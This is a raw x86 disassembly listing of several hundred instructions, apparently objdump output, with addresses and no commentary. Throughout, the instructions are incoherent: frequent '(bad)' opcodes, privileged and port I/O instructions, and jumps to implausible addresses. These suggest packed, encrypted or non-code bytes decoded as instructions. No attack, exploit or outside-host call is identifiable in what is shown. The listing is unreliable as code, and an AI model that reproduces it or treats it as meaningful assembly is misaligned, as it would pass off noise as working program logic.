  4329a8:	retf   0xff54
  4329ab:	push   ecx
  4329ac:	mov    DWORD PTR ds:0x757210,eax
  4329b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4329b5:	sub    esp,DWORD PTR [ebx-0x77]
  4329b8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4329bf:	or     ah,bh
  4329c1:	pop    es
  4329c2:	ds fwait
  4329c4:	push   DWORD PTR [edx]
  4329c6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4329cc:	(bad)  
  4329cd:	mov    bh,bh
  4329cf:	jmp    0x4329bd
  4329d1:	leave  
  4329d2:	jne    0x4329dc
  4329d4:	call   0x30232e
  4329d9:	in     al,dx
  4329da:	dec    ebp
  4329db:	add    dh,BYTE PTR [ebx]
  4329dd:	add    BYTE PTR [ebx],al
  4329df:	inc    ebp
  4329e0:	cmp    esi,DWORD PTR [ecx]
  4329e2:	je     0x432980
  4329e4:	mov    eax,edi
  4329e6:	or     al,0xf0
  4329e8:	add    BYTE PTR [ebp+0x458bf845],al
  4329ee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4329f4:	adc    al,0x7
  4329f6:	enter  0x9fc0,0xa5
  4329fa:	rol    BYTE PTR [eax],0x5e
  4329fd:	mov    ecx,ecx
  4329ff:	or     al,0xc
  432a01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a08:	jmp    0x432a09
  432a0a:	push   ebp
  432a0b:	mov    esp,ebp
  432a0d:	cld    
  432a0e:	inc    ebp
  432a0f:	inc    ebp
  432a10:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a17:	push   esi
  432a18:	push   esi
  432a19:	mov    edi,0x7af080f
  432a1e:	add    bh,al
  432a20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432a26:	add    BYTE PTR [ecx+0x4540100f],cl
  432a2c:	mov    ebp,eax
  432a2e:	mov    ebp,edi
  432a30:	lock call edx
  432a33:	fcom   DWORD PTR [ebp+0x45]
  432a36:	mov    eax,0x148a8b
  432a3b:	push   ecx
  432a3c:	enter  0xc145,0x83
  432a40:	cmp    ecx,DWORD PTR [eax]
  432a42:	add    BYTE PTR [ebp+0x4d],al
  432a45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a4b:	call   0xffa325ba
  432a50:	cmp    eax,DWORD PTR [ebp-0xc]
  432a53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a57:	push   ebp
  432a58:	(bad)  
  432a59:	call   0x34285d
  432a5e:	mov    bh,0xdb
  432a60:	cld    
  432a61:	or     BYTE PTR [ebp+0x45],bl
  432a64:	(bad)  
  432a65:	call   0xff7d26f5
  432a6a:	add    al,BYTE PTR [ebp+0x37]
  432a6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432a73:	jne    0x432a75
  432a75:	(bad)  
  432a76:	cmp    edi,esp
  432a78:	jne    0x432aab
  432a7a:	mov    edi,edi
  432a7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432a82:	pop    ds
  432a83:	into   
  432a84:	je     0x432a47
  432a86:	mov    ebx,DWORD PTR [esi]
  432a88:	or     BYTE PTR [ebp-0x49],al
  432a8b:	mov    esp,DWORD PTR [esi-0x77]
  432a8e:	mov    esi,0x2451f0c
  432a93:	mov    eax,DWORD PTR [eax]
  432a95:	or     al,0x66
  432a97:	sar    bl,0x3b
  432a9a:	xor    esi,DWORD PTR [ebp+0x66]
  432a9d:	xor    ecx,edi
  432a9f:	pop    edi
  432aa0:	adc    bl,BYTE PTR [ebx+0x7e]
  432aa3:	ret    0xff
  432aa6:	cld    
  432aa7:	inc    ebp
  432aa8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432aae:	cld    
  432aaf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432ab6:	push   0xffffff83
  432ab8:	pop    edi
  432ab9:	or     BYTE PTR [ebp+0x53],dh
  432abc:	xorps  xmm1,xmm2
  432abf:	test   BYTE PTR [eax+eax*1],bh
  432ac2:	add    BYTE PTR [eax],al
  432ac4:	adc    eax,eax
  432ac6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432ace:	jmp    DWORD PTR [eax]
  432ad0:	ror    al,0x5e
  432ad3:	inc    ebp
  432ad4:	leave  
  432ad5:	xor    ecx,DWORD PTR [eax]
  432ad7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432add:	add    ah,al
  432adf:	xor    edi,edi
  432ae1:	xor    DWORD PTR [ebx],0x66003302
  432ae7:	mov    DWORD PTR [ebp-0xc],ecx
  432aea:	pcmpgtw mm0,mm0
  432aed:	add    dl,ah
  432aef:	leave  
  432af0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432af4:	push   eax
  432af5:	dec    ebp
  432af6:	mov    esi,DWORD PTR [ebx-0x75]
  432af9:	lea    ebp,[eax-0x7c00ff02]
  432aff:	xor    eax,DWORD PTR [eax]
  432b01:	sysret 
  432b03:	dec    ebp
  432b04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b0b:	push   WORD PTR [ecx+0x8]
  432b0f:	jne    0x432ad2
  432b11:	ud0    ecx,DWORD PTR [ecx]
  432b14:	mov    eax,edx
  432b16:	lods   al,BYTE PTR ds:[esi]
  432b17:	add    BYTE PTR [eax],al
  432b19:	data16 (bad) 
  432b1b:	iret   
  432b1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b23:	cli    
  432b24:	inc    ebp
  432b25:	cmp    al,0x8d
  432b27:	add    BYTE PTR [esi+0x2d],ah
  432b2a:	inc    ebp
  432b2b:	pop    ebp
  432b2c:	lea    ecx,[edi]
  432b2e:	mov    dl,bh
  432b30:	add    BYTE PTR [edi],cl
  432b32:	mov    DWORD PTR [eax+eax*8],edi
  432b35:	mov    ebx,0x3b87
  432b3a:	add    BYTE PTR [ebx],ch
  432b3c:	inc    ebp
  432b3d:	data16 (bad) 
  432b3f:	clc    
  432b40:	int3   
  432b41:	cmp    eax,DWORD PTR [eax]
  432b43:	je     0x432ace
  432b45:	push   0xffffffc8
  432b47:	pop    edi
  432b48:	xchg   DWORD PTR [ebp+0x0],eax
  432b4b:	data16 add BYTE PTR [ebp+0x45],cl
  432b4f:	lea    cx,[ebp+0x10]
  432b53:	jb     0x432b55
  432b55:	jmp    0x432ae0
  432b57:	call   eax
  432b59:	clc    
  432b5a:	xchg   DWORD PTR [edi+0x1],edi
  432b5d:	mov    eax,DWORD PTR [eax]
  432b5f:	or     BYTE PTR [ebp-0x49],al
  432b62:	lea    eax,[eax+0x74003154]
  432b68:	push   edi
  432b69:	inc    edx
  432b6a:	jge    0x432b6b
  432b6c:	mov    DWORD PTR [edi],ecx
  432b6e:	fdiv   DWORD PTR [edi-0x6]
  432b71:	inc    DWORD PTR [eax]
  432b73:	xor    edx,DWORD PTR [eax+0x5f]
  432b76:	xchg   DWORD PTR [ebx+0x1],ebx
  432b79:	ret    0x0
  432b7c:	xor    BYTE PTR [ebp-0x51],cl
  432b7f:	cmp    edi,0xf0ff89fe
  432b85:	data16 ror al,0x84
  432b89:	rol    BYTE PTR [eax],0x3b
  432b8c:	add    al,dh
  432b8e:	dec    eax
  432b8f:	xchg   esp,eax
  432b90:	push   ebx
  432b91:	jmp    0x432b1e
  432b93:	push   ebp
  432b94:	add    esp,ebp
  432b96:	add    ebp,esp
  432b98:	mov    edx,DWORD PTR [edi+0x24]
  432b9b:	clc    
  432b9c:	dec    esi
  432b9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ba3:	cmp    BYTE PTR [ebx],al
  432ba5:	jne    0x432b30
  432ba7:	xor    esp,eax
  432ba9:	jmp    0x462d2c
  432bae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bb1:	jne    0x432ba7
  432bb3:	call   0xffcd290d
  432bb8:	clc    
  432bb9:	xchg   edi,eax
  432bba:	sti    
  432bbb:	add    DWORD PTR [ebx],eax
  432bbd:	add    BYTE PTR [ebp+0x47],bl
  432bc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432bc6:	pop    ebp
  432bc7:	mov    DWORD PTR [esi-0x48],esi
  432bca:	jmp    0x432c13
  432bcc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432bd2:	(bad)  
  432bd4:	cmp    al,0x0
  432bd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432bd9:	lea    ebx,[ebp-0x56]
  432bdc:	jle    0x432bde
  432bde:	jae    0x432b69
  432be0:	mov    eax,esp
  432be2:	call   0xb900:0x8b005587
  432be9:	inc    ebp
  432bea:	push   ebp
  432beb:	lea    ecx,[ebp-0x27ff4f12]
  432bf1:	mov    eax,edi
  432bf3:	int3   
  432bf4:	push   ebp
  432bf5:	xchg   edi,eax
  432bf7:	add    esp,ebp
  432bf9:	add    BYTE PTR [eax],al
  432bfb:	inc    ebp
  432bfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432c02:	cld    
  432c03:	mov    DWORD PTR [edx],edi
  432c05:	aam    0x75
  432c07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c0d:	mov    DWORD PTR [ebx-0x50],edx
  432c10:	test   BYTE PTR [ebp-0x1],0xe8
  432c14:	mov    eax,DWORD PTR [eax]
  432c16:	hlt    
  432c17:	add    al,al
  432c19:	mov    eax,DWORD PTR ds:0x890045a8
  432c1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c25:	inc    DWORD PTR [eax*2+0xf75854d]
  432c2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c32:	call   0x72998973
  432c37:	je     0x432c97
  432c39:	js     0x432c9a
  432c3b:	lock ret 0x7e
  432c3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c45:	mov    edi,edi
  432c47:	sbb    al,bl
  432c49:	clc    
  432c4a:	add    BYTE PTR [ebp-0x73],bh
  432c4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c53:	ror    BYTE PTR [eax],1
  432c55:	dec    ebp
  432c56:	xchg   ebp,eax
  432c57:	mov    edi,edi
  432c59:	in     al,0x8b
  432c5b:	jge    0x432be6
  432c5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432c63:	clc    
  432c64:	pop    esi
  432c65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432c6b:	clc    
  432c6c:	add    al,0x6e
  432c6e:	mov    eax,DWORD PTR [ebx]
  432c70:	mov    BYTE PTR [ebp+0x0],dl
  432c73:	mov    edx,DWORD PTR [ebx-0x20]
  432c76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432c7c:	add    eax,0x3b3b73
  432c81:	adc    al,0x89
  432c83:	pop    eax
  432c84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432c88:	ret    0xf08
  432c8b:	cmp    al,0x2
  432c8d:	mov    edx,eax
  432c8f:	cld    
  432c90:	add    BYTE PTR [ebp+0x66],dl
  432c93:	add    eax,ebx
  432c95:	add    esp,eax
  432c97:	sub    eax,eax
  432c99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432c9f:	add    BYTE PTR [eax],al
  432ca1:	mov    DWORD PTR [ebx-0x24],ebx
  432ca4:	push   edi
  432ca5:	push   ebp
  432ca6:	clc    
  432ca7:	add    DWORD PTR [esi+0x1b0100],0x45
  432cae:	out    0xff,eax
  432cb0:	add    edx,DWORD PTR [eax]
  432cb2:	jmp    0x432c9c
  432cb4:	cmp    ch,0x46
  432cb7:	(bad)  
  432cb8:	jmp    0x40c8b50a
  432cbd:	je     0x432c49
  432cbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432cc5:	inc    ebp
  432cc6:	add    BYTE PTR [ebx-0x770375],al
  432ccc:	add    ah,ch
  432cce:	add    edx,esp
  432cd0:	pop    edi
  432cd1:	pop    ebp
  432cd2:	push   ebp
  432cd3:	inc    ebx
  432cd4:	in     al,dx
  432cd5:	pop    ebp
  432cd6:	in     al,dx
  432cd7:	cmp    edx,DWORD PTR [edi-0x8]
  432cda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432ce1:	add    al,0x47
  432ce3:	push   ebp
  432ce4:	mov    esp,ebp
  432ce6:	in     al,0x45
  432ce8:	dec    ebp
  432ce9:	push   esi
  432cea:	test   DWORD PTR [eax+0xfb010f],esi
  432cf0:	add    BYTE PTR [eax+0xc018b],dh
  432cf6:	leave  
  432cf7:	inc    ebp
  432cf8:	test   al,ch
  432cfa:	add    dh,bh
  432cfc:	add    bh,bh
  432cfe:	dec    ebp
  432cff:	push   cs
  432d00:	mov    DWORD PTR [ecx],eax
  432d02:	hlt    
  432d03:	push   es
  432d04:	dec    ebp
  432d05:	leave  
  432d06:	mov    DWORD PTR [eax],ecx
  432d08:	clc    
  432d09:	cmovge eax,ecx
  432d0c:	mov    ecx,0x85c2f0
  432d12:	clc    
  432d13:	pop    DWORD PTR [ebp+0x1]
  432d16:	push   ebx
  432d17:	add    BYTE PTR [ebp-0x15],bh
  432d1a:	push   esi
  432d1b:	xor    eax,0x898a45
  432d20:	cld    
  432d21:	add    al,BYTE PTR [ebp+0x0]
  432d24:	xor    esp,DWORD PTR [esi-0x64]
  432d27:	add    DWORD PTR [esi+0x78308c1],edi
  432d2d:	add    ah,BYTE PTR [ebp-0x49]
  432d30:	int    0xbb
  432d32:	mov    ecx,DWORD PTR [esi+0xc]
  432d35:	add    dh,al
  432d37:	cmp    ecx,ebx
  432d39:	jne    0x432d03
  432d3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432d3e:	jmp    0xca2d44
  432d43:	add    DWORD PTR [ebp+0x0],eax
  432d46:	mov    eax,ebx
  432d48:	or     al,0x8b
  432d4a:	(bad)  
  432d4b:	mov    ecx,esi
  432d4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432d54:	mov    eax,edi
  432d56:	or     BYTE PTR [edx],cl
  432d58:	shl    cl,cl
  432d5a:	icebp  
  432d5b:	add    BYTE PTR [ebp+0x38],0x8b
  432d5f:	or     BYTE PTR [edx+eax*2],cl
  432d62:	(bad)  
  432d63:	or     cl,dh
  432d65:	stc    
  432d66:	shl    DWORD PTR [ebp-0x30],0xc6
  432d6a:	xor    al,0x0
  432d6c:	inc    ebp
  432d6d:	xchg   BYTE PTR [ebx],al
  432d6f:	add    esp,edi
  432d71:	add    BYTE PTR [ebp-0x39],cl
  432d74:	mov    al,bl
  432d76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432d7c:	sub    al,0xbf
  432d7e:	jmp    0x432d05
  432d80:	mov    edi,eax
  432d82:	lock jge 0x432d76
  432d85:	lea    esi,[edx-0x74bad5ff]
  432d8b:	mov    ebp,esp
  432d8d:	or     cl,dh
  432d8f:	leave  
  432d90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432d97:	dec    ebp
  432d98:	dec    ebp
  432d99:	test   DWORD PTR [ebx],eax
  432d9b:	paddb  mm6,mm0
  432d9e:	add    DWORD PTR [eax],eax
  432da0:	dec    ebp
  432da1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432da7:	mov    esi,DWORD PTR [edx]
  432da9:	or     al,0x2b
  432dab:	dec    ebp
  432dac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432db2:	mov    esp,edi
  432db4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dbb:	mov    DWORD PTR [ebx],ebp
  432dbd:	call   0xc76b6ed
  432dc2:	mov    DWORD PTR [ebp+0x10],ecx
  432dc5:	(bad)  
  432dc6:	push   0x8b85ff10
  432dcb:	clc    
  432dcc:	or     al,0x54
  432dce:	(bad)  
  432dcf:	push   ecx
  432dd0:	retf   
  432dd1:	mov    ebx,0xff4d8dc8
  432dd6:	mov    DWORD PTR [ebp+0x8],eax
  432dd9:	xor    eax,DWORD PTR [ebp-0x75]
  432ddc:	cmp    ebp,DWORD PTR [ebx]
  432dde:	lsl    ebx,WORD PTR [edi-0x8]
  432de2:	call   DWORD PTR [ebx-0x741bff75]
  432de8:	(bad)  
  432de9:	or     al,0x5b
  432deb:	dec    ebp
  432dec:	or     BYTE PTR [ebx],dh
  432dee:	inc    ebp
  432def:	xor    esi,DWORD PTR ds:0x708088d
  432df5:	in     eax,0x9b
  432df7:	add    BYTE PTR [edx],dh
  432df9:	inc    ebp
  432dfa:	pop    edi
  432dfb:	xor    eax,edx
  432dfd:	test   DWORD PTR [eax],0x81108b8b
  432e03:	dec    ebp
  432e04:	sub    al,0x33
  432e06:	add    BYTE PTR [ebx],dh
  432e08:	push   esi
  432e09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e0f:	mov    edi,eax
  432e11:	or     BYTE PTR [ebp+0x45],al
  432e14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e1a:	xor    ecx,ecx
  432e1c:	pushf  
  432e1d:	push   es
  432e1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432e25:	dec    ebp
  432e26:	inc    ebp
  432e27:	cmp    BYTE PTR [ecx],0x54
  432e2a:	pushf  
  432e2b:	gs (bad) 
  432e2d:	shl    esp,1
  432e2f:	dec    ebp
  432e30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432e36:	shr    ecx,1
  432e38:	xlat   BYTE PTR ds:[ebx]
  432e39:	rol    bh,cl
  432e3b:	mov    edx,esp
  432e3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432e43:	mov    ecx,DWORD PTR [eax]
  432e45:	or     BYTE PTR [eax],al
  432e47:	push   ebp
  432e48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e4e:	dec    ebp
  432e4f:	enter  0xceba,0x8
  432e53:	retf   0x1807
  432e56:	ret    0x9b4d
  432e59:	mov    esi,DWORD PTR [edx]
  432e5b:	or     al,0x33
  432e5d:	into   
  432e5e:	add    edx,esi
  432e60:	add    ecx,edx
  432e62:	bswap  eax
  432e64:	ror    esi,0x98
  432e67:	dec    ebp
  432e68:	add    cl,ch
  432e6a:	mov    edi,edi
  432e6c:	hlt    
  432e6d:	inc    esi
  432e6f:	inc    ebp
  432e70:	ret    0x4533
  432e73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432e79:	or     BYTE PTR [ebx],dh
  432e7b:	dec    ebp
  432e7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432e82:	jne    0xff8d2e49
  432e88:	inc    ebp
  432e89:	inc    ebp
  432e8a:	mov    esi,DWORD PTR [ebx]
  432e8c:	clc    
  432e8d:	pop    esi
  432e8e:	ret    0xcaeb
  432e91:	mov    eax,esi
  432e93:	call   0x52048366
  432e98:	dec    ebp
  432e99:	add    eax,0xf8728b
  432e9e:	adc    eax,0xce0ccac9
  432ea3:	push   ebp
  432ea4:	ret    0xc6ec
  432ea7:	in     al,dx
  432ea8:	call   0x33437bb1
  432ead:	push   edi
  432eae:	add    edi,eax
  432eb0:	xor    eax,eax
  432eb2:	jmp    0x432ef9
  432eb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432eba:	add    eax,edi
  432ebc:	shr    eax,cl
  432ebe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432ec4:	mov    esi,DWORD PTR [edx]
  432ec6:	in     al,dx
  432ec7:	pushf  
  432ec8:	ret    0x84c7
  432ecb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432ed1:	inc    ebp
  432ed2:	in     al,dx
  432ed3:	xor    DWORD PTR [ebp-0x64],eax
  432ed6:	mov    eax,edi
  432ed8:	cld    
  432ed9:	fmul   st(2),st
  432edb:	sbb    dl,al
  432edd:	jmp    0x9c3b:0x304d45c1
  432ee4:	jbe    0x432ead
  432ee6:	mov    esp,eax
  432ee8:	clc    
  432ee9:	add    BYTE PTR [ebp+0x0],cl
  432eec:	mov    ecx,ecx
  432eee:	lea    eax,[ebp-0x5]
  432ef1:	mov    edi,edi
  432ef3:	call   0x51ce833d
  432ef8:	hlt    
  432ef9:	xor    eax,edx
  432efb:	mov    esi,0x9b7284
  432f00:	xor    cl,dl
  432f02:	mov    esi,eax
  432f04:	hlt    
  432f05:	into   
  432f06:	inc    ebp
  432f07:	scas   eax,DWORD PTR es:[edi]
  432f08:	mov    ebp,ecx
  432f0a:	cld    
  432f0b:	add    dl,cl
  432f0d:	add    dl,al
  432f0f:	inc    ebp
  432f10:	shr    DWORD PTR [ebx],0x4d
  432f13:	xor    edi,DWORD PTR [ebx]
  432f15:	mov    DWORD PTR [edi],ecx
  432f17:	clc    
  432f18:	dec    esi
  432f19:	inc    ebp
  432f1a:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f20:	ret    0xc6ca
  432f23:	mov    BYTE PTR [ebp-0x32],0x53
  432f27:	scas   eax,DWORD PTR es:[edi]
  432f28:	inc    ebp
  432f29:	jmp    0x432f5b
  432f2b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f32:	pop    ebx
  432f33:	xor    ecx,DWORD PTR [ebp+0x3]
  432f36:	mov    eax,DWORD PTR [ebx]
  432f38:	clc    
  432f39:	test   edx,ecx
  432f3b:	mov    ecx,esi
  432f3d:	cld    
  432f3e:	call   0x8ab77488
  432f43:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f49:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f4f:	fdiv   QWORD PTR [ebx]
  432f51:	retf   0xce89
  432f54:	in     al,0xc1
  432f56:	inc    ebp
  432f57:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432f5d:	into   
  432f5e:	mov    dh,0xc1
  432f61:	call   0x8c1774ea
  432f66:	(bad)  
  432f67:	cld    
  432f68:	mov    ecx,DWORD PTR [ebp-0x14]
  432f6b:	xor    eax,ecx
  432f6d:	lea    eax,[ebp+0x8]
  432f70:	mov    esi,DWORD PTR [edx-0x4]
  432f73:	add    dl,al
  432f75:	inc    ebp
  432f76:	mov    esp,0x32d89b8b
  432f7b:	dec    ebp
  432f7c:	mov    esi,DWORD PTR [ebx]
  432f7e:	cld    
  432f7f:	xor    eax,edx
  432f81:	sub    esp,DWORD PTR [ebp-0x75]
  432f84:	int    0xec
  432f86:	sub    ecx,eax
  432f88:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432f8e:	mov    esi,esp
  432f90:	call   0x34177d19
  432f95:	inc    DWORD PTR [ebx]
  432f97:	mov    edi,DWORD PTR [ebx]
  432f99:	cld    
  432f9a:	jne    0x432fe9
  432f9c:	mov    esi,DWORD PTR [ebx]
  432f9e:	aam    0x8d
  432fa0:	dec    ebp
  432fa1:	or     BYTE PTR [ebx],dh
  432fa3:	jb     0x432fa8
  432fa5:	add    BYTE PTR [edi+0x45],bl
  432fa8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432faf:	xor    ebp,esp
  432fb1:	xor    eax,edi
  432fb3:	sub    edi,esp
  432fb5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  432fbb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432fc2:	inc    ebp
  432fc3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432fc9:	clc    
  432fca:	mov    eax,edi
  432fcc:	nop
  432fcd:	fadd   QWORD PTR [eax]
  432fcf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432fd5:	jmp    0x432f60
  432fd7:	mov    eax,DWORD PTR [ecx]
  432fd9:	fadd   DWORD PTR [eax]
  432fdb:	inc    ebp
  432fdc:	or     DWORD PTR [ebx],esi
  432fde:	dec    eax
  432fdf:	add    edx,DWORD PTR [ebx-0x2d]
  432fe2:	dec    ebp
  432fe3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432fe9:	inc    ebp
  432fea:	push   esp
  432feb:	mov    dl,BYTE PTR [ecx-0xd]
  432fee:	xor    ecx,DWORD PTR [ebp-0x45]
  432ff1:	(bad)  
  432ff3:	rol    BYTE PTR [eax],0xc1
  432ff6:	ret    
  432ff7:	inc    ebp
  432ff8:	inc    ebp
  432ff9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  432fff:	xor    eax,ebx
  433001:	add    eax,DWORD PTR [ebp+0x23]
  433004:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43300a:	cmp    edi,0xc
  43300d:	dec    ebp
  43300e:	inc    ebp
  43300f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433015:	inc    ebp
  433016:	mov    esi,DWORD PTR [ebx]
  433018:	clc    
  433019:	lea    eax,[ebp+0x45725407]
  43301f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433023:	xor    edi,DWORD PTR [eax]
  433025:	mov    ecx,0xff8b8d4d
  43302a:	push   esp
  43302b:	enter  0x4df7,0x23
  43302f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433035:	mov    eax,DWORD PTR [ebx]
  433037:	loopne 0x433024
  433039:	ret    0xc68b
  43303c:	push   esp
  43303d:	enter  0x9745,0x8b
  433041:	inc    ebp
  433042:	cld    
  433043:	mov    eax,edi
  433045:	clc    
  433046:	ret    
  433047:	ret    0xc645
  43304a:	mov    esi,DWORD PTR [ebx]
  43304c:	cld    
  43304d:	pop    esi
  43304e:	mov    ebx,0x83458bc3
  433054:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433058:	dec    ebp
  433059:	xor    DWORD PTR [ebx],esi
  43305b:	pushf  
  43305c:	add    edi,DWORD PTR [edx-0x7767a77]
  433062:	fcom   DWORD PTR [ebp+0x45]
  433065:	mov    esi,DWORD PTR [ebx]
  433067:	adc    al,0x9c
  433069:	inc    ebp
  43306a:	(bad)  
  43306b:	mov    ebx,eax
  43306d:	adc    al,0x85
  43306f:	cmp    al,0x1
  433072:	inc    ebp
  433073:	add    BYTE PTR ds:0xe98b9c4d,bh
  433079:	mov    eax,DWORD PTR [ebx]
  43307b:	nop
  43307c:	add    BYTE PTR [eax],al
  43307e:	inc    ebp
  43307f:	mov    esi,DWORD PTR [ebx]
  433081:	add    eax,DWORD PTR [ebx]
  433083:	cmp    al,0x89
  433085:	mov    esp,esi
  433087:	clc    
  433088:	inc    ebp
  433089:	inc    ebp
  43308a:	add    edx,DWORD PTR [esi+0xc]
  43308d:	mov    edi,0x7ff0845
  433092:	in     al,dx
  433093:	(bad)  
  433094:	jne    0x433031
  433096:	mov    esi,DWORD PTR [edx]
  433098:	clc    
  433099:	add    ebp,DWORD PTR [esi]
  43309b:	mov    edi,edi
  43309d:	in     al,dx
  43309e:	mov    DWORD PTR [ebp-0x10],eax
  4330a1:	xor    eax,DWORD PTR [ebp+0x3]
  4330a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4330aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4330b0:	lea    ecx,[ecx+0x45e8d4bc]
  4330b6:	clc    
  4330b7:	mov    edi,edi
  4330b9:	cmp    BYTE PTR [ebp+0x4d],al
  4330bc:	test   DWORD PTR [eax+0x74],ecx
  4330bf:	inc    ecx
  4330c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4330c6:	ret    
  4330c7:	inc    eax
  4330c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4330ce:	push   eax
  4330cf:	dec    eax
  4330d0:	test   al,0xd0
  4330d2:	dec    eax
  4330d4:	mov    eax,DWORD PTR [ebp-0x14]
  4330d7:	mov    eax,DWORD PTR [ebp+0x38]
  4330da:	mov    eax,ecx
  4330dc:	fadd   DWORD PTR [ebx]
  4330de:	dec    ebp
  4330df:	inc    eax
  4330e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4330e6:	inc    ebp
  4330e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4330ed:	fadd   QWORD PTR [ebx]
  4330ef:	inc    ebp
  4330f0:	or     al,0x33
  4330f2:	dec    ebp
  4330f3:	add    edi,DWORD PTR [ebx]
  4330f5:	mov    DWORD PTR [edx-0x28],esi
  4330f8:	mov    eax,DWORD PTR [ebp-0x10]
  4330fb:	mov    eax,DWORD PTR [eax+0x10]
  4330fe:	mov    eax,edi
  433100:	lock ret 
  433102:	inc    ecx
  433103:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433109:	fsubr  st,st(5)
  43310b:	test   DWORD PTR [eax],eax
  43310d:	clc    
  43310e:	push   0x45
  433110:	(bad)  
  433111:	cmp    al,0xec
  433113:	pushf  
  433114:	inc    ebp
  433115:	(bad)  
  433116:	push   eax
  433117:	fsub   DWORD PTR [eax-0x7b]
  43311a:	(bad)  
  43311b:	clc    
  43311c:	mov    eax,0xf8008584
  433121:	mov    eax,DWORD PTR [ebp-0x4]
  433124:	mov    edi,0x4585c3cc
  43312a:	clc    
  43312b:	mov    eax,DWORD PTR [ebp+0x14]
  43312e:	xor    eax,DWORD PTR [ebp-0x64]
  433131:	mov    edi,eax
  433133:	in     al,dx
  433134:	les    esi,FWORD PTR [ebp-0x7b]
  433137:	mov    edi,eax
  433139:	or     al,0x4d
  43313b:	dec    ebp
  43313c:	mov    eax,ebp
  43313e:	in     al,0xf2
  433140:	dec    ebp
  433141:	dec    DWORD PTR [ecx+0x4dc7e045]
  433147:	fmul   DWORD PTR [ecx+0x4df8f085]
  43314d:	inc    ebp
  43314e:	mov    DWORD PTR [ebx],esi
  433150:	fadd   QWORD PTR [ebx]
  433152:	dec    ebp
  433153:	push   eax
  433154:	xor    eax,DWORD PTR [ebp+0x3]
  433157:	push   eax
  433158:	mov    DWORD PTR [eax+ebx*8],ebx
  43315b:	push   esi
  43315d:	mov    eax,DWORD PTR [eax]
  43315f:	lock cmp eax,0xf84e85c0
  433165:	inc    ebp
  433166:	test   BYTE PTR [ebx],dh
  433168:	add    DWORD PTR [ebx],eax
  43316a:	add    BYTE PTR [eax+0x4d],dl
  43316d:	jne    0x4331a2
